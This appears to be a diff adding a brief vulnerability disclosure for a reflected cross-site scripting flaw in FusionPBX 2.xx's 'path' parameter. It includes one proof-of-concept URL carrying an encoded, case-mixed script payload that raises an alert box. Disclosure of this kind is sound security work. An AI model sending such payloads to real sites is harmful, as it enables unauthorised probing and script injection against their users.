@@ -1,0 +1,5 @@
+A Cross Site Scripting (XSS) vulnerability exists in FusionPBX 2.xx that allows remote malicious users to inject arbitrary web script or HTML via an unsanitized "path" parameter.
+
+https://omnichannel.teste.com.br/index.php?path=1%27%22%3C%3E%3CScRiPt%20%3Ealert(%22chorao%22)%3C/ScRiPt%3E
+
+
